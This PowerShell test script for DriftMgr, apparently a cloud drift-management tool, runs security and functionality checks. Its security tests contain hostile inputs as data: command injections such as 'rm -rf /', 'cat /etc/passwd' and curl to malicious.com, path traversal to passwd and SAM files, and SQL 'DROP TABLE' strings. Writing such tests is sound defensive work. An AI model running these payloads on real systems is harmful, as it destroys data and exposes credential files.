# DriftMgr Comprehensive Test Runner
# This script runs both security and functionality tests for DriftMgr

param(
    [switch]$SecurityOnly,
    [switch]$FunctionalityOnly,
    [switch]$Quick,
    [switch]$Verbose
)

Write-Host "Starting DriftMgr Comprehensive Test Suite" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan

# Test counters
$Global:PASSED = 0
$Global:FAILED = 0
$Global:SKIPPED = 0

# Function to run a test and report results
function Run-Test {
    param(
        [string]$TestName,
        [string]$TestCommand,
        [string]$ExpectedOutput = ""
    )
    
    Write-Host "Testing: $TestName" -ForegroundColor Yellow
    Write-Host "Command: $TestCommand" -ForegroundColor Gray
    
    if ($ExpectedOutput) {
        Write-Host "Expected: $ExpectedOutput" -ForegroundColor Gray
    }
    
    try {
        $result = Invoke-Expression $TestCommand 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "PASS: $TestName" -ForegroundColor Green
            $Global:PASSED++
        } else {
            Write-Host "FAIL: $TestName" -ForegroundColor Red
            if ($Verbose) {
                Write-Host "Output: $result" -ForegroundColor Red
            }
            $Global:FAILED++
        }
    } catch {
        Write-Host "FAIL: $TestName" -ForegroundColor Red
        if ($Verbose) {
            Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        }
        $Global:FAILED++
    }
}

# Function to run a security test (should fail)
function Run-SecurityTest {
    param(
        [string]$TestName,
        [string]$TestCommand
    )
    
    Write-Host "Security Test: $TestName" -ForegroundColor Yellow
    Write-Host "Command: $TestCommand" -ForegroundColor Gray
    
    try {
        $result = Invoke-Expression $TestCommand 2>&1
        $exitCode = $LASTEXITCODE
        
        # Check if the command was rejected (non-zero exit code or exception)
        if ($exitCode -eq 0 -and $result -notmatch "error|invalid|rejected|denied|failed|not found") {
            Write-Host "SECURITY FAILURE: $TestName - Command succeeded when it should have failed" -ForegroundColor Red
            if ($Verbose) {
                Write-Host "Output: $result" -ForegroundColor Red
            }
            $Global:FAILED++
        } else {
            Write-Host "SECURITY PASS: $TestName - Command properly rejected" -ForegroundColor Green
            $Global:PASSED++
        }
    } catch {
        Write-Host "SECURITY PASS: $TestName - Command properly rejected" -ForegroundColor Green
        $Global:PASSED++
    }
}

# Function to skip a test
function Skip-Test {
    param(
        [string]$TestName,
        [string]$Reason
    )
    
    Write-Host "SKIP: $TestName - $Reason" -ForegroundColor Yellow
    $Global:SKIPPED++
}

# Security Tests
if (-not $FunctionalityOnly) {
    Write-Host "1. Security Testing" -ForegroundColor Cyan
    
    if ($Quick) {
        Write-Host "Quick Mode: Running only critical security tests" -ForegroundColor Yellow
    }
    
    # Input Validation and Sanitization Tests
    Write-Host "Input Validation and Sanitization Tests" -ForegroundColor Yellow
    
    Run-SecurityTest "Command Injection - discover" "./bin/driftmgr.exe discover `"aws; rm -rf /`""
    Run-SecurityTest "Command Injection - analyze" "./bin/driftmgr.exe analyze `"terraform; cat /etc/passwd`""
    Run-SecurityTest "Command Injection - remediate" "./bin/driftmgr.exe remediate `"example; curl http://malicious.com`""
    
    Run-SecurityTest "Path Traversal - analyze" "./bin/driftmgr.exe analyze `"../../../etc/passwd`""
    Run-SecurityTest "Path Traversal - export" "./bin/driftmgr.exe export `"..\\..\\..\\windows\\system32\\config\\sam`""
    Run-SecurityTest "Path Traversal - statefiles" "./bin/driftmgr.exe statefiles `"..%2f..%2f..%2fetc%2fpasswd`""
    
    Run-SecurityTest "SQL Injection - credentials" "./bin/driftmgr.exe credentials `"; DROP TABLE users; --`""
    Run-SecurityTest "SQL Injection - analyze" "./bin/driftmgr.exe analyze `"; SELECT * FROM sensitive_data; --`""
    
    # Authentication and Authorization Tests
    Write-Host "Authentication and Authorization Tests" -ForegroundColor Yellow
    
    Run-Test "Credential Validation - AWS" "./bin/driftmgr.exe credentials validate aws"
    Run-Test "Credential Validation - Azure" "./bin/driftmgr.exe credentials validate azure"
    Run-Test "Credential Validation - GCP" "./bin/driftmgr.exe credentials validate gcp"
    
    Run-Test "Access Control - Dry Run" "./bin/driftmgr.exe discover aws all --dry-run"
    Run-SecurityTest "Access Control - Force Critical" "./bin/driftmgr.exe remediate critical --force"
    
    # Data Protection Tests
    Write-Host "Data Protection Tests" -ForegroundColor Yellow
    
    Run-Test "Sensitive Data - Debug Mode" "./bin/driftmgr.exe discover aws all --debug"
    Run-Test "State Encryption" "./bin/driftmgr.exe analyze terraform --encrypt-state"
    Run-Test "Output Encryption" "./bin/driftmgr.exe export aws --encrypt-output"
    
    # Network Security Tests
    Write-Host "Network Security Tests" -ForegroundColor Yellow
    
    # Check if server is available before testing API endpoints
    $serverAvailable = $false
    try {
        $response = Invoke-WebRequest -Uri "http://localhost:8080/api/v1/health" -Method GET -TimeoutSec 3 -ErrorAction SilentlyContinue
        if ($response.StatusCode -eq 200) {
            $serverAvailable = $true
        }
    } catch {
        $serverAvailable = $false
    }
    
    if ($serverAvailable) {
        Run-Test "API Health Check" "Invoke-WebRequest -Uri 'http://localhost:8080/api/v1/health' -Method GET -TimeoutSec 5"
        Run-Test "API Discovery Endpoint" "`$body = '{\"provider\":\"aws\"}'; Invoke-WebRequest -Uri 'http://localhost:8080/api/v1/discover' -Method POST -Headers @{'Content-Type'='application/json'} -Body `$body -TimeoutSec 5"
        Run-Test "API Resources Endpoint" "Invoke-WebRequest -Uri 'http://localhost:8080/api/v1/resources' -Method GET -TimeoutSec 5"
        Run-SecurityTest "CORS Configuration" "Invoke-WebRequest -Uri 'http://localhost:8080/api/v1/health' -Headers @{'Origin'='http://malicious.com'}"
    } else {
        Skip-Test "API Health Check" "Server not available"
        Skip-Test "API Discovery Endpoint" "Server not available"
        Skip-Test "API Resources Endpoint" "Server not available"
        Skip-Test "CORS Configuration" "Server not available"
    }
    
    # Audit Logging Tests
    Write-Host "Audit Logging Tests" -ForegroundColor Yellow
    
    Run-Test "Audit Logging - Discovery" "./bin/driftmgr.exe discover aws us-east-1"
    Run-Test "Audit Logging - Analysis" "./bin/driftmgr.exe analyze terraform"
    Run-Test "Audit Logging - Remediation" "./bin/driftmgr.exe remediate example --generate"
    
    # Check if logs were created
    if ((Test-Path "logs") -and ((Get-ChildItem "logs" | Measure-Object).Count -gt 0)) {
        Write-Host "PASS: Audit logs created" -ForegroundColor Green
        $Global:PASSED++
    } else {
        Write-Host "FAIL: No audit logs found" -ForegroundColor Red
        $Global:FAILED++
    }
}

# Functionality Tests
if (-not $SecurityOnly) {
    Write-Host "2. Functionality Testing" -ForegroundColor Cyan
    
    if ($Quick) {
        Write-Host "Quick Mode: Running only core functionality tests" -ForegroundColor Yellow
    }
    
    # Core Discovery Engine Tests
    Write-Host "Core Discovery Engine Tests" -ForegroundColor Yellow
    
    Run-Test "AWS Discovery - All Regions" "./bin/driftmgr.exe discover aws all"
    Run-Test "AWS Discovery - US East 1" "./bin/driftmgr.exe discover aws us-east-1"
    Run-Test "AWS Discovery - EU West 1" "./bin/driftmgr.exe discover aws eu-west-1"
    Run-Test "AWS Discovery - AP Southeast 1" "./bin/driftmgr.exe discover aws ap-southeast-1"
    
    Run-Test "AWS Discovery - Resource Filtering" "./bin/driftmgr.exe discover aws us-east-1 --resource-types ec2_instance,s3_bucket"
    Run-Test "AWS Discovery - Exclude Types" "./bin/driftmgr.exe discover aws us-east-1 --exclude-types iam_user,iam_role"
    
    Run-Test "Azure Discovery - All Regions" "./bin/driftmgr.exe discover azure all"
    Run-Test "Azure Discovery - East US" "./bin/driftmgr.exe discover azure eastus"
    Run-Test "Azure Discovery - West Europe" "./bin/driftmgr.exe discover azure westeurope"
    
    # GCP Discovery Tests (skip if API not configured)
    if ($env:GCP_PROJECT_ID) {
        Run-Test "GCP Discovery - All Regions" "./bin/driftmgr.exe discover gcp all"
        Run-Test "GCP Discovery - US Central 1" "./bin/driftmgr.exe discover gcp us-central1"
        Run-Test "GCP Discovery - Europe West 1" "./bin/driftmgr.exe discover gcp europe-west1"
    } else {
        Skip-Test "GCP Discovery - All Regions" "GCP_PROJECT_ID not set"
        Skip-Test "GCP Discovery - US Central 1" "GCP_PROJECT_ID not set"
        Skip-Test "GCP Discovery - Europe West 1" "GCP_PROJECT_ID not set"
    }
    
    # Drift Analysis Tests
    Write-Host "Drift Analysis Tests" -ForegroundColor Yellow
    
    Run-Test "Basic Terraform Analysis" "./bin/driftmgr.exe analyze terraform"
    Run-Test "Terraform Analysis - JSON Output" "./bin/driftmgr.exe analyze terraform --output-format=json"
    
    if (Test-Path "./examples/statefiles/terraform.tfstate") {
        Run-Test "Terraform Analysis - Custom State File" "./bin/driftmgr.exe analyze terraform --state-file=./examples/statefiles/terraform.tfstate"
    } else {
        Skip-Test "Terraform Analysis - Custom State File" "State file not found"
    }
    
    Run-Test "Enhanced Analysis - Sensitive Fields" "./bin/driftmgr.exe analyze terraform --sensitive-fields tags.environment,tags.owner"
    Run-Test "Enhanced Analysis - Ignore Fields" "./bin/driftmgr.exe analyze terraform --ignore-fields tags.last-updated,metadata.timestamp"
    Run-Test "Enhanced Analysis - Severity Rules" "./bin/driftmgr.exe analyze terraform --severity-rules production=critical"
    
    Run-Test "Multi-Provider Analysis" "./bin/driftmgr.exe analyze terraform --providers aws,azure"
    Run-Test "Provider Comparison" "./bin/driftmgr.exe analyze terraform --compare-providers"
    
    # Remediation Engine Tests
    Write-Host "Remediation Engine Tests" -ForegroundColor Yellow
    
    Run-Test "Remediation Generation - Example" "./bin/driftmgr.exe remediate example --generate"
    Run-Test "Remediation Generation - Terraform" "./bin/driftmgr.exe remediate terraform --generate --dry-run"
    Run-Test "Remediation Generation - AWS" "./bin/driftmgr.exe remediate aws --generate --resource-types ec2_instance"
    
    Run-Test "Remediation Execution - Approval Required" "./bin/driftmgr.exe remediate terraform --execute --approval-required"
    Run-Test "Remediation Execution - Batch Size" "./bin/driftmgr.exe remediate aws --execute --batch-size=5"
    Run-Test "Remediation Execution - Rollback Enabled" "./bin/driftmgr.exe remediate critical --execute --rollback-enabled"
    
    Run-Test "Remediation History - List" "./bin/driftmgr.exe remediate-history list"
    Run-Test "Remediation History - Show" "./bin/driftmgr.exe remediate-history show test-session"
    Run-Test "Remediation Rollback" "./bin/driftmgr.exe remediate-rollback test-session"
    
    # Visualization and Export Tests
    Write-Host "Visualization and Export Tests" -ForegroundColor Yellow
    
    Run-Test "Diagram Generation - PNG" "./bin/driftmgr.exe diagram aws --format=png"
    Run-Test "Diagram Generation - SVG" "./bin/driftmgr.exe diagram aws --format=svg"
    Run-Test "Diagram Generation - Resource Filter" "./bin/driftmgr.exe diagram aws --include-resources ec2_instance,vpc"
    
    Run-Test "Data Export - JSON" "./bin/driftmgr.exe export aws --format=json"
    Run-Test "Data Export - CSV" "./bin/driftmgr.exe export aws --format=csv"
    Run-Test "Data Export - YAML" "./bin/driftmgr.exe export aws --format=yaml"
    Run-Test "Data Export - Terraform" "./bin/driftmgr.exe export aws --format=terraform"
    
    # Integration Tests
    Write-Host "Integration Tests" -ForegroundColor Yellow
    
    Run-Test "Terragrunt Plan" "./bin/driftmgr.exe terragrunt plan"
    Run-Test "Terragrunt Apply" "./bin/driftmgr.exe terragrunt apply"
    Run-Test "Terragrunt Destroy" "./bin/driftmgr.exe terragrunt destroy"
    Run-Test "Terragrunt Run All" "./bin/driftmgr.exe terragrunt run-all plan"
    
    Run-Test "CI/CD - Discovery Output" "./bin/driftmgr.exe discover aws all --output-file=discovery.json"
    Run-Test "CI/CD - Analysis Output" "./bin/driftmgr.exe analyze terraform --output-file=drift-report.json"
    Run-Test "CI/CD - Remediation Output" "./bin/driftmgr.exe remediate terraform --auto-approve --output-file=remediation.log"
    
    # Performance and Scalability Tests
    Write-Host "Performance and Scalability Tests" -ForegroundColor Yellow
    
    Run-Test "Large Scale - High Concurrency" "./bin/driftmgr.exe discover aws all --concurrency=20"
    Run-Test "Large Scale - Extended Timeout" "./bin/driftmgr.exe discover aws all --timeout=30m"
    Run-Test "Large Scale - Large Batch Size" "./bin/driftmgr.exe discover aws all --batch-size=100"
    
    Run-Test "Resource Limits - Memory" "./bin/driftmgr.exe discover aws all --memory-limit=2GB"
    Run-Test "Resource Limits - CPU" "./bin/driftmgr.exe analyze terraform --cpu-limit=4"
    
    # Error Handling and Recovery Tests
    Write-Host "Error Handling and Recovery Tests" -ForegroundColor Yellow
    
    Run-Test "Network Recovery - Retry Attempts" "./bin/driftmgr.exe discover aws all --retry-attempts=5"
    Run-Test "Network Recovery - Retry Delay" "./bin/driftmgr.exe discover aws all --retry-delay=10s"
    
    Run-Test "Partial Failure - Continue on Error" "./bin/driftmgr.exe discover aws all --continue-on-error"
    Run-Test "Partial Failure - Remediation Continue" "./bin/driftmgr.exe remediate terraform --continue-on-error"
    
    Run-Test "State Recovery - Backup State" "./bin/driftmgr.exe analyze terraform --backup-state"
    Run-Test "State Recovery - Validate State" "./bin/driftmgr.exe analyze terraform --validate-state"
    
    # Configuration and Environment Tests
    Write-Host "Configuration and Environment Tests" -ForegroundColor Yellow
    
    if (Test-Path "./config/config.yaml") {
        Run-Test "Config Loading - Default" "./bin/driftmgr.exe --config=./config/config.yaml"
    } else {
        Skip-Test "Config Loading - Default" "Default config file not found"
    }
    
    if (Test-Path "./config/custom-config.yaml") {
        Run-Test "Config Loading - Custom" "./bin/driftmgr.exe --config=./config/custom-config.yaml"
    } else {
        Skip-Test "Config Loading - Custom" "Custom config file not found"
    }
    
    # Documentation and Usability Tests
    Write-Host "Documentation and Usability Tests" -ForegroundColor Yellow
    
    Run-Test "Main Help" "./bin/driftmgr.exe --help"
    Run-Test "Discover Help" "./bin/driftmgr.exe discover --help"
    Run-Test "Analyze Help" "./bin/driftmgr.exe analyze --help"
    Run-Test "Remediate Help" "./bin/driftmgr.exe remediate --help"
    
    # Automated Test Suite
    Write-Host "Automated Test Suite" -ForegroundColor Yellow
    
    if (Get-Command "go" -ErrorAction SilentlyContinue) {
        if (Test-Path "./tests/unit") {
            Run-Test "Unit Test Coverage" "go test ./tests/unit/... -v -cover"
            Run-Test "Race Condition Tests" "go test ./tests/unit/... -v -race"
            Run-Test "Benchmark Tests" "go test ./tests/unit/... -v -bench=."
        } else {
            Skip-Test "Unit Test Coverage" "Unit test directory not found"
            Skip-Test "Race Condition Tests" "Unit test directory not found"
            Skip-Test "Benchmark Tests" "Unit test directory not found"
        }
        
        if (Test-Path "./tests/integration") {
            Run-Test "Integration Tests" "go test ./tests/integration/... -v"
            Run-Test "Integration Tests - Timeout" "go test ./tests/integration/... -v -timeout=10m"
        } else {
            Skip-Test "Integration Tests" "Integration test directory not found"
            Skip-Test "Integration Tests - Timeout" "Integration test directory not found"
        }
    } else {
        Skip-Test "Unit Test Coverage" "Go not installed"
        Skip-Test "Race Condition Tests" "Go not installed"
        Skip-Test "Benchmark Tests" "Go not installed"
        Skip-Test "Integration Tests" "Go not installed"
        Skip-Test "Integration Tests - Timeout" "Go not installed"
    }
    
    if (Test-Path "./scripts/test-e2e.sh") {
        Run-Test "End-to-End Tests" "./scripts/test-e2e.sh"
    } else {
        Skip-Test "End-to-End Tests" "Script not found"
    }
    
    # Final Functionality Validation
    Write-Host "Final Functionality Validation" -ForegroundColor Yellow
    
    Run-Test "Complete Workflow" "./bin/driftmgr.exe discover aws us-east-1"
    
    # Check if server is available for final validation
    if ($serverAvailable) {
        Run-Test "Server Functionality" "Invoke-WebRequest -Uri 'http://localhost:8080/api/v1/health' -Method GET -TimeoutSec 5"
    } else {
        Skip-Test "Server Functionality" "Server not available"
    }
    
    Run-Test "Client Functionality" "./bin/driftmgr.exe health"
}

# Results Summary
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "Test Results Summary" -ForegroundColor Cyan
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "Tests Passed: $Global:PASSED" -ForegroundColor Green
Write-Host "Tests Failed: $Global:FAILED" -ForegroundColor Red
Write-Host "Tests Skipped: $Global:SKIPPED" -ForegroundColor Yellow
Write-Host "Total Tests: $($Global:PASSED + $Global:FAILED + $Global:SKIPPED)" -ForegroundColor Blue

# Calculate success rate
$totalRun = $Global:PASSED + $Global:FAILED
if ($totalRun -gt 0) {
    $successRate = [math]::Round(($Global:PASSED * 100) / $totalRun, 1)
    Write-Host "Success Rate: $successRate%" -ForegroundColor Blue
}

if ($Global:FAILED -eq 0) {
    Write-Host "All tests passed! DriftMgr is secure and functional." -ForegroundColor Green
    exit 0
} else {
    Write-Host "$($Global:FAILED) test(s) failed. Please review and fix the issues." -ForegroundColor Red
    exit 1
}
